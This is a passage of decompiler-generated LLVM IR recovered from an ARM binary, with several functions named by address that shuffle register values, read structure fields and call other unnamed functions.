dec_label_pc_d990:                                ; preds = %dec_label_pc_d984
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d994 = call i32 @function_10110(i32 4096)
  store i32 %v1_d994, i32* %r0.global-to-local, align 4
  %v2_d998 = icmp eq i32 %v1_d994, 0
  %v1_d9a8.pre = load i32, i32* @sb, align 4
  br i1 %v2_d998, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_d990
  %v2_d99c = inttoptr i32 %v1_d9a8.pre to i16*
  %v3_d99c = load i16, i16* %v2_d99c, align 2
  %v4_d99c = zext i16 %v3_d99c to i32
  %v2_d9a0 = add i32 %v1_d994, 4096
  store i32 %v2_d9a0, i32* %r2.global-to-local, align 4
  %v2_d9a4 = or i32 %v4_d99c, 16384
  store i32 %v2_d9a4, i32* %r3.global-to-local, align 4
  %v2_d9a8 = add i32 %v1_d9a8.pre, 8
  %v3_d9a8 = inttoptr i32 %v2_d9a8 to i32*
  store i32 %v1_d994, i32* %v3_d9a8, align 4
  %v1_d9ac = load i32, i32* %r2.global-to-local, align 4
  %v2_d9ac = load i32, i32* @sb, align 4
  %v3_d9ac = add i32 %v2_d9ac, 12
  %v4_d9ac = inttoptr i32 %v3_d9ac to i32*
  store i32 %v1_d9ac, i32* %v4_d9ac, align 4
  %v1_d9b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d9b0 = trunc i32 %v1_d9b0 to i16
  %v3_d9b0 = load i32, i32* @sb, align 4
  %v4_d9b0 = inttoptr i32 %v3_d9b0 to i16*
  store i16 %v2_d9b0, i16* %v4_d9b0, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_d990
  %v2_d9a819 = add i32 %v1_d9a8.pre, 8
  %v3_d9a820 = inttoptr i32 %v2_d9a819 to i32*
  store i32 0, i32* %v3_d9a820, align 4
  %v2_d9b4 = load i32, i32* @sb, align 4
  %v3_d9b4 = add i32 %v2_d9b4, 12
  %v4_d9b4 = inttoptr i32 %v3_d9b4 to i32*
  store i32 0, i32* %v4_d9b4, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_d984, %.thread9
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_d9c0 = load i32, i32* @fp, align 4
  %v2_d9c0 = add i32 %v0_d9c0, 60
  %v3_d9c0 = inttoptr i32 %v2_d9c0 to i32*
  %v4_d9c0 = load i32, i32* %v3_d9c0, align 4
  store i32 %v4_d9c0, i32* %r3.global-to-local, align 4
  %v2_d9c4 = load i32, i32* @sb, align 4
  %v3_d9c4 = add i32 %v2_d9c4, 2
  %v4_d9c4 = inttoptr i32 %v3_d9c4 to i8*
  store i8 0, i8* %v4_d9c4, align 1
  %v0_d9c8 = load i32, i32* @sb, align 4
  %v1_d9c8 = inttoptr i32 %v0_d9c8 to i16*
  %v2_d9c8 = load i16, i16* %v1_d9c8, align 2
  %v3_d9c8 = zext i16 %v2_d9c8 to i32
  store i32 %v3_d9c8, i32* %r2.global-to-local, align 4
  %v0_d9cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d9cc = inttoptr i32 %v0_d9cc to i32*
  %v2_d9cc = load i32, i32* %v1_d9cc, align 4
  store i32 %v2_d9cc, i32* %r1.global-to-local, align 4
  %v1_d9d0 = add i32 %v0_d9c8, 8
  %v2_d9d0 = inttoptr i32 %v1_d9d0 to i32*
  %v3_d9d0 = load i32, i32* %v2_d9d0, align 4
  store i32 %v3_d9d0, i32* %r3.global-to-local, align 4
  %v1_d9d4 = and i32 %v3_d9c8, 8192
  %v2_d9d4 = icmp eq i32 %v1_d9d4, 0
  %v2_d9d8 = add i32 %v0_d9c8, 20
  %v3_d9d8 = inttoptr i32 %v2_d9d8 to i32*
  store i32 %v3_d9d0, i32* %v3_d9d8, align 4
  %v0_d9dc = load i32, i32* %r0.global-to-local, align 4
  %v1_d9dc = load i32, i32* @sb, align 4
  %v2_d9dc = add i32 %v1_d9dc, 44
  %v3_d9dc = inttoptr i32 %v2_d9dc to i32*
  store i32 %v0_d9dc, i32* %v3_d9dc, align 4
  %v0_d9e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_d9e0 = load i32, i32* @sb, align 4
  %v2_d9e0 = add i32 %v1_d9e0, 52
  %v3_d9e0 = inttoptr i32 %v2_d9e0 to i32*
  store i32 %v0_d9e0, i32* %v3_d9e0, align 4
  %v0_d9e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d9e4 = load i32, i32* @sb, align 4
  %v2_d9e4 = add i32 %v1_d9e4, 24
  %v3_d9e4 = inttoptr i32 %v2_d9e4 to i32*
  store i32 %v0_d9e4, i32* %v3_d9e4, align 4
  %v0_d9e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d9e8 = load i32, i32* @sb, align 4
  %v2_d9e8 = add i32 %v1_d9e8, 28
  %v3_d9e8 = inttoptr i32 %v2_d9e8 to i32*
  store i32 %v0_d9e8, i32* %v3_d9e8, align 4
  %v0_d9ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d9ec = load i32, i32* @sb, align 4
  %v2_d9ec = add i32 %v1_d9ec, 16
  %v3_d9ec = inttoptr i32 %v2_d9ec to i32*
  store i32 %v0_d9ec, i32* %v3_d9ec, align 4
  br i1 %v2_d9d4, label %dec_label_pc_daa8, label %dec_label_pc_d9f4

dec_label_pc_d9f4:                                ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_d9f8 = load i32, i32* @fp, align 4
  %v2_d9f8 = add i32 %v0_d9f8, 36
  %v3_d9f8 = inttoptr i32 %v2_d9f8 to i32*
  %v4_d9f8 = load i32, i32* %v3_d9f8, align 4
  store i32 %v4_d9f8, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_da00 = add i32 %v0_d9f8, 112
  %v3_da00 = inttoptr i32 %v2_da00 to i32*
  %v4_da00 = load i32, i32* %v3_da00, align 4
  store i32 %v4_da00, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_da08 = ptrtoint i32* %stack_var_-56 to i32
  %v2_da0c = add i32 %v0_d9f8, 76
  %v3_da0c = inttoptr i32 %v2_da0c to i32*
  %v4_da0c = load i32, i32* %v3_da0c, align 4
  store i32 %v4_d9f8, i32* %r1.global-to-local, align 4
  store i32 %v4_da00, i32* %r2.global-to-local, align 4
  store i32 %v2_da08, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_da0c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_da28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_da28, i32* %r0.global-to-local, align 4
  %v0_da2c = load i32, i32* @fp, align 4
  %v2_da2c = add i32 %v0_da2c, 16
  %v3_da2c = inttoptr i32 %v2_da2c to i32*
  %v4_da2c = load i32, i32* %v3_da2c, align 4
  call void @__pseudo_branch(i32 %v4_da2c)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_da3c = load i32, i32* @fp, align 4
  %v2_da3c = add i32 %v0_da3c, 100
  %v3_da3c = inttoptr i32 %v2_da3c to i32*
  %v4_da3c = load i32, i32* %v3_da3c, align 4
  store i32 %v4_da3c, i32* %r4.global-to-local, align 4
  %v0_da40 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_da40, i32* %r1.global-to-local, align 4
  store i32 %v4_da3c, i32* %r2.global-to-local, align 4
  store i32 %v2_d7f8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_da0c)
  store i32 %v4_da3c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_da2c)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_da64 = load i32, i32* @fp, align 4
  %v2_da64 = add i32 %v0_da64, 48
  %v3_da64 = inttoptr i32 %v2_da64 to i32*
  %v4_da64 = load i32, i32* %v3_da64, align 4
  store i32 %v4_da64, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_da6c = inttoptr i32 %v4_da64 to i32*
  %v2_da6c = load i32, i32* %v1_da6c, align 4
  store i32 %v2_da6c, i32* %r2.global-to-local, align 4
  store i32 %v2_d7f8, i32* %r0.global-to-local, align 4
  %v1_da74 = load i32, i32* @sb, align 4
  %v2_da74 = add i32 %v1_da74, 32
  %v3_da74 = inttoptr i32 %v2_da74 to i32*
  store i32 %v2_da6c, i32* %v3_da74, align 4
  %v0_da78 = load i32, i32* @fp, align 4
  %v1_da78 = load i32, i32* %r3.global-to-local, align 4
  %v2_da78 = add i32 %v1_da78, %v0_da78
  %v3_da78 = inttoptr i32 %v2_da78 to i32*
  %v4_da78 = load i32, i32* %v3_da78, align 4
  store i32 %v4_da78, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_da80 = load i32, i32* @sb, align 4
  %v1_da80 = load i32, i32* @ip, align 4
  %v2_da80 = inttoptr i32 %v1_da80 to i32*
  store i32 %v0_da80, i32* %v2_da80, align 4
  call void @__pseudo_branch(i32 %v4_da78)
  store i32 %v2_da08, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_da78)
  br label %dec_label_pc_daa8

dec_label_pc_daa4:                                ; preds = %dec_label_pc_d838, %dec_label_pc_d824, %dec_label_pc_d844
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_daa8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_d87c, %bb40, %dec_label_pc_d9f4, %dec_label_pc_daa4
  %v0_daa8 = load i32, i32* @sb, align 4
  store i32 %v0_daa8, i32* %r0.global-to-local, align 4
  %v2_dab0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_dab0, i32* @r4, align 4
  store i32 %v6_d7e4, i32* @r5, align 4
  store i32 %v9_d7e4, i32* @r6, align 4
  store i32 %v18_d7e4, i32* @sb, align 4
  store i32 %v24_d7e4, i32* @fp, align 4
  ret i32 %v0_daa8

; uselistorder directives
  uselistorder i32 %v1_d9a8.pre, { 2, 1, 0 }
  uselistorder i32 %v1_d994, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d93c, { 1, 2, 0 }
  uselistorder i32 %v0_d908, { 1, 0 }
  uselistorder i32 %v1_d8cc, { 1, 0 }
  uselistorder i32 %v0_d8cc, { 1, 0 }
  uselistorder i32 %v1_d8b4, { 1, 0, 2 }
  uselistorder i32 %v1_d86c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 3, 4, 5, 6, 7, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 15, 14, 16, 17, 18, 19, 1, 20, 2, 7, 6, 9, 8, 0, 10, 4, 3, 5 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_daa8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_daa4, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d984, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_d8fc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d8a4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d854, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d838, { 1, 0 }
  uselistorder label %dec_label_pc_d824, { 1, 2, 0 }
}

define i32 @function_dabc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dabc:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_dabc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dabc, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_dabc
  %v1_dac4 = load i32, i32* %r2.global-to-local, align 4
  %v2_dac4 = load i32, i32* %r3.global-to-local, align 4
  %v3_dac4 = and i32 %v2_dac4, %v1_dac4
  %v2_dac8 = trunc i32 %v3_dac4 to i16
  %v4_dac8 = inttoptr i32 %v3_dac4 to i16*
  store i16 %v2_dac8, i16* %v4_dac8, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_dabc, %bb
  %v0_daf0 = call i32 @function_d0ec()
  store i32 %v0_daf0, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_dafc = inttoptr i32 %v0_daf0 to i32*
  %v2_dafc = load i32, i32* %v1_dafc, align 4
  store i32 %v2_dafc, i32* @r6, align 4
  %v1_db00 = call i32 @function_fbb4(i32 0)
  %v2_db08 = icmp eq i32 %v1_db00, 0
  store i32 142964, i32* @r4, align 4
  br i1 %v2_db08, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 416, i32* %r2.global-to-local, align 4
  %v5_db14 = load i16, i16* inttoptr (i32 143380 to i16*), align 4
  %v7_db14 = zext i16 %v5_db14 to i32
  %v2_db18 = xor i32 %v7_db14, 256
  store i32 %v2_db18, i32* @r3, align 4
  %v2_db1c = trunc i32 %v2_db18 to i16
  store i16 %v2_db1c, i16* inttoptr (i32 143380 to i16*), align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_db24 = call i32 @function_fbb4(i32 1)
  %v2_db28 = icmp eq i32 %v1_db24, 0
  br i1 %v2_db28, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_db30 = load i32, i32* @r4, align 4
  %v3_db30 = add i32 %v1_db30, 416
  store i32 %v3_db30, i32* %r2.global-to-local, align 4
  %v2_db34 = add i32 %v1_db30, 496
  %v3_db34 = inttoptr i32 %v2_db34 to i16*
  %v4_db34 = load i16, i16* %v3_db34, align 2
  %v5_db34 = zext i16 %v4_db34 to i32
  %v2_db38 = xor i32 %v5_db34, 256
  store i32 %v2_db38, i32* %r3.global-to-local, align 4
  %v2_db3c = trunc i32 %v2_db38 to i16
  store i16 %v2_db3c, i16* %v3_db34, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_db40 = load i32, i32* @r6, align 4
  %v1_db40 = load i32, i32* @r5, align 4
  %v2_db40 = inttoptr i32 %v1_db40 to i32*
  store i32 %v0_db40, i32* %v2_db40, align 4
  ret i32 %v1_db24

; uselistorder directives
  uselistorder i32 %v3_dac4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_fbb4, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_db54(i32 %arg1) local_unnamed_addr {
dec_label_pc_db54:
  store i32 142964, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_19a98.314 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_db70 = call i32 @function_f700()
  ret i32 %v0_db70
}

define i32 @function_dc5c() local_unnamed_addr {
dec_label_pc_dc5c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dc5c = load i32, i32* @r4, align 4
  store i32 %v3_dc5c, i32* %stack_var_-8, align 4
  %v0_dc60 = load i32, i32* @r0, align 4
  %v1_dc60 = add i32 %v0_dc60, 8
  %v2_dc60 = inttoptr i32 %v1_dc60 to i32*
  %v3_dc60 = load i32, i32* %v2_dc60, align 4
  %v1_dc64 = add i32 %v0_dc60, 16
  %v2_dc64 = inttoptr i32 %v1_dc64 to i32*
  %v3_dc64 = load i32, i32* %v2_dc64, align 4
  %v9_dc68 = icmp eq i32 %v3_dc64, %v3_dc60
  store i32 %v0_dc60, i32* %r4.global-to-local, align 4
  br i1 %v9_dc68, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_dc5c
  store i32 %v3_dc60, i32* %v2_dc64, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_dc5c, %bb
  %v1_dc74 = xor i1 %v9_dc68, true
  call void @__pseudo_cond_branch(i1 %v1_dc74, i32 ptrtoint (i32* @global_var_13840.315 to i32))
  %v0_dc78 = load i32, i32* %r4.global-to-local, align 4
  %v1_dc78 = add i32 %v0_dc78, 8
  %v2_dc78 = inttoptr i32 %v1_dc78 to i32*
  %v3_dc78 = load i32, i32* %v2_dc78, align 4
  %v1_dc7c = add i32 %v0_dc78, 16
  %v2_dc7c = inttoptr i32 %v1_dc7c to i32*
  %v3_dc7c = load i32, i32* %v2_dc7c, align 4
  %v2_dc80 = sub i32 %v3_dc7c, %v3_dc78
  %v2_dc84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dc84, i32* @r4, align 4
  ret i32 %v2_dc80

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_dc8c(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_dc8c:
  %stack_var_-25 = alloca i8, align 1
  %v3_dc8c = load i32, i32* @r4, align 4
  %v6_dc8c = load i32, i32* @r5, align 4
  %v9_dc8c = load i32, i32* @r6, align 4
  %v12_dc8c = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_dc98 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_dc98, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_dcb02 = icmp eq i32 %arg3, 0
  br i1 %v2_dcb02, label %dec_label_pc_dcd0, label %dec_label_pc_dcc4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dcc4
  %v1_dcac = add i32 %v0_dcac, -1
  store i32 %v1_dcac, i32* @r4, align 4
  %v2_dcb0 = icmp eq i32 %v1_dcac, 0
  %v0_dcbc = load i32, i32* @r7, align 4
  br i1 %v2_dcb0, label %dec_label_pc_dcd0.loopexit, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dc8c, %dec_label_pc_dcac
  %v0_dcbc4 = phi i32 [ %v0_dcbc, %dec_label_pc_dcac ], [ %arg1, %dec_label_pc_dc8c ]
  %v3_dcc4 = inttoptr i32 %v0_dcbc4 to i16*
  %v4_dcc4 = call i32 @function_138f4(i32 %v10_dc98, i32 1, i16* %v3_dcc4)
  %v7_dcc8 = icmp eq i32 %v4_dcc4, 1
  %v0_dcac = load i32, i32* @r4, align 4
  br i1 %v7_dcc8, label %dec_label_pc_dcac, label %dec_label_pc_dcd0.loopexit

dec_label_pc_dcd0.loopexit:                       ; preds = %dec_label_pc_dcac, %dec_label_pc_dcc4
  %v0_dcd0.ph = phi i32 [ %v0_dcac, %dec_label_pc_dcc4 ], [ 0, %dec_label_pc_dcac ]
  %v1_dcd0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dcd0

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_dcd0.loopexit, %dec_label_pc_dc8c
  %v1_dcd0 = phi i32 [ 0, %dec_label_pc_dc8c ], [ %v1_dcd0.pre, %dec_label_pc_dcd0.loopexit ]
  %v0_dcd0 = phi i32 [ 0, %dec_label_pc_dc8c ], [ %v0_dcd0.ph, %dec_label_pc_dcd0.loopexit ]
  %v2_dcd0 = sub i32 %v1_dcd0, %v0_dcd0
  store i32 %v3_dc8c, i32* @r4, align 4
  store i32 %v6_dc8c, i32* @r5, align 4
  store i32 %v9_dc8c, i32* @r6, align 4
  store i32 %v12_dc8c, i32* @r7, align 4
  ret i32 %v2_dcd0

; uselistorder directives
  uselistorder i32 %v1_dcac, { 1, 0 }
  uselistorder label %dec_label_pc_dcd0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_dcc4, { 1, 0 }
}

define i32 @function_dce0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dce0:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_dce0 = load i32, i32* @r4, align 4
  store i32 %v3_dce0, i32* %stack_var_-24, align 4
  %v6_dce0 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_dce8 = and i32 %arg2, 128
  %v2_dce8 = icmp eq i32 %v1_dce8, 0
  %v0_dcec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dcec, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_dce8, label %dec_label_pc_dd3cthread-pre-split, label %dec_label_pc_dd00

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dce0
  store i32 %arg4, i32* @r0, align 4
  %v0_dd04 = call i32 @function_f670()
  store i32 %v0_dd04, i32* %r0.global-to-local, align 4
  %v1_dd08 = load i32, i32* %r4.global-to-local, align 4
  %v2_dd08 = sub i32 %v1_dd08, %v0_dd04
  store i32 %v2_dd08, i32* @r4, align 4
  store i32 %v0_dd04, i32* @r6, align 4
  %tmp12 = icmp slt i32 %v2_dd08, 1
  br i1 %tmp12, label %.thread, label %dec_label_pc_dd1c

.thread:                                          ; preds = %dec_label_pc_dd00
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dd38

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dd00
  %v0_dd1c = load i32, i32* @r5, align 4
  %v1_dd1c = urem i32 %v0_dd1c, 128
  %v0_dd20 = load i32, i32* @r8, align 4
  store i32 %v0_dd20, i32* %r0.global-to-local, align 4
  %v3_dd28 = trunc i32 %v1_dd1c to i8
  %v4_dd28 = call i32 @function_dc8c(i32 %v0_dd20, i8 %v3_dd28, i32 %v2_dd08)
  store i32 %v4_dd28, i32* %r0.global-to-local, align 4
  %v1_dd2c = load i32, i32* @r4, align 4
  %v9_dd2c = icmp eq i32 %v4_dd28, %v1_dd2c
  store i32 %v4_dd28, i32* %r5.global-to-local, align 4
  br i1 %v9_dd2c, label %dec_label_pc_dd1c.dec_label_pc_dd38_crit_edge, label %dec_label_pc_dd58

dec_label_pc_dd1c.dec_label_pc_dd38_crit_edge:    ; preds = %dec_label_pc_dd1c
  %v0_dd38.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dd38

dec_label_pc_dd38:                                ; preds = %.thread, %dec_label_pc_dd1c.dec_label_pc_dd38_crit_edge
  %v0_dd38 = phi i32 [ %v0_dd38.pre, %dec_label_pc_dd1c.dec_label_pc_dd38_crit_edge ], [ %v0_dd04, %.thread ]
  store i32 %v0_dd38, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_dd3cthread-pre-split:                ; preds = %dec_label_pc_dce0
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd3cthread-pre-split, %dec_label_pc_dd38
  %v5_dd48 = phi i32 [ %arg3, %dec_label_pc_dd3cthread-pre-split ], [ %v0_dd38, %dec_label_pc_dd38 ]
  %tmp13 = icmp slt i32 %v5_dd48, 1
  br i1 %tmp13, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_dd3c
  br label %bb14

bb:                                               ; preds = %dec_label_pc_dd3c
  %v5_dd44 = load i32, i32* @r7, align 4
  br label %bb14

bb14:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_dd44, %bb ]
  %tmp15 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp15, i32 ptrtoint (i32* @global_var_138f4.316 to i32))
  %v0_dd54 = load i32, i32* %r5.global-to-local, align 4
  %v2_dd54 = add i32 %storemerge, %v0_dd54
  store i32 %v2_dd54, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dd58

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd1c, %bb14
  %v0_dd58 = phi i32 [ %v4_dd28, %dec_label_pc_dd1c ], [ %v2_dd54, %bb14 ]
  store i32 %v0_dd58, i32* %r0.global-to-local, align 4
  %v2_dd5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dd5c, i32* %r4.global-to-local, align 4
  store i32 %v6_dce0, i32* %r5.global-to-local, align 4
  ret i32 %v0_dd58

; uselistorder directives
  uselistorder i32 %v0_dd58, { 1, 0 }
  uselistorder i32 %v0_dd38, { 1, 0 }
  uselistorder i32 %v2_dd08, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_dd58, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_dd38, { 1, 0 }
}

define i32 @function_dd64(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_dd64:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_4()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_4()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_dd64 = load i32, i32* @r5, align 4
  %v12_dd64 = load i32, i32* @r7, align 4
  %v18_dd64 = load i32, i32* @sb, align 4
  %v21_dd64 = load i32, i32* @sl, align 4
  %v24_dd64 = load i32, i32* @fp, align 4
  %v2_dd6c = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_dd6c, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_dd6c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_dd7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dd7c, i32* @r5, align 4
  %v2_dd80 = call i32 @function_e44c(i32* nonnull %stack_var_-352)
  store i32 %v2_dd80, i32* %r0.global-to-local, align 4
  %v1_dd88 = icmp slt i32 %v2_dd80, 0
  br i1 %v1_dd88, label %dec_label_pc_dd98, label %dec_label_pc_ddcc

dec_label_pc_dd98:                                ; preds = %dec_label_pc_dd64
  %v3_dd98 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_dd98, i32* @r4, align 4
  store i32 %v3_dd98, i32* @r0, align 4
  %v0_dda0 = call i32 @function_f670()
  store i32 %v0_dda0, i32* %r0.global-to-local, align 4
  %v2_dda4 = icmp eq i32 %v0_dda0, 0
  br i1 %v2_dda4, label %bb, label %dec_label_pc_ddb4

bb:                                               ; preds = %dec_label_pc_dd98
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e41c

dec_label_pc_ddb4:                                ; preds = %dec_label_pc_dd98
  %v0_ddb4 = load i32, i32* @r4, align 4
  store i32 %v0_ddb4, i32* %r0.global-to-local, align 4
  %v0_ddb8 = load i32, i32* @fp, align 4
  store i32 %v0_ddb8, i32* %r2.global-to-local, align 4
  %v3_ddbc = inttoptr i32 %v0_ddb8 to i16*
  %v4_ddbc = call i32 @function_138f4(i32 %v0_ddb4, i32 %v0_dda0, i16* %v3_ddbc)
  store i32 %v4_ddbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e41c

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dd64
  %v0_ddcc = load i32, i32* @r5, align 4
  store i32 %v2_dd6c, i32* %r0.global-to-local, align 4
  %v2_ddd4 = call i32 @function_e4ec(i32 %v2_dd6c, i32 %v0_ddcc)
  store i32 %v2_ddd4, i32* %r0.global-to-local, align 4
  store i32 656, i32* @ip, align 4
  %v0_de1c = load i32, i32* @r4, align 4
  store i32 %v0_de1c, i32* %r2.global-to-local, align 4
  %v1_dea0 = bitcast i32* %stack_var_-352 to i8*
  %v4_deb0 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_debc = ptrtoint i32* %stack_var_-272 to i32
  %v2_ded4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_def0 = icmp eq i32 %tmp104, 0
